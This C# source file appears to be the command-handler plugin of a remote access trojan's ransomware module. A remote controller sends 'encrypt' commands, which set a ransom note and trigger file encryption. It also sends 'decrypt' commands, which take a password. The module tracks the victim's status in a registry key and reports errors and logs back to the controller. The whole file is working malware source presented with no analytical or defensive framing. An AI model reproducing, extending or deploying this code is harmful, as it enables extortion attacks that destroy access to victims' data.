using System;
using System.Threading;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Plugin.Handler;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "encrypt":
                    {
                        var readValue = Registry.GetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid,
                            "Rans-Status", null);
                        if (Conversions.ToBoolean(
                                Operators.ConditionalCompareObjectEqual(readValue, "Encrypted", false)))
                        {
                            Error(Connection.Hwid + "Already Encrypted!");
                            return;
                        }

                        var enc = new HandleEncrypt();
                        enc.Mynote = unpack_msgpack.ForcePathObject("Message").AsString;
                        Thread.Sleep(1000);
                        enc.BeforeAttack();
                        break;
                    }

                    case "decrypt":
                    {
                        var readValue = Registry.GetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid,
                            "Rans-Status", null);
                        if (Conversions.ToBoolean(
                                Operators.ConditionalCompareObjectEqual(readValue, "Decrypted", false)))
                        {
                            Error(Connection.Hwid + "Already decrypted!");
                            return;
                        }

                        var enc = new HandleDecrypt();
                        enc.Pass = unpack_msgpack.ForcePathObject("Password").AsString;
                        Thread.Sleep(1000);
                        enc.BeforeDec();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string message)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}